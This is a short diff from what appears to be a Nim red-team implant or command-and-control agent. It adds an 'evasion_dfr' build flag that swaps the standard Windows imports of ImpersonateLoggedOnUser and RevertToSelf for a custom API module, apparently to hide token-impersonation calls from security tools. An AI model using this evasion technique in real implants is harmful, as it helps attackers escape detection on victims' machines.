@@ -5,7 +5,11 @@ import ../utils/strenc
 import token_manager
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except ImpersonateLoggedOnUser, RevertToSelf
+    import ../utils/winapi
+  else:
+    import winim/lean
   
   proc makeToken*(taskId: string, params: JsonNode): JsonNode =
     ## Create a new logon token and impersonate it
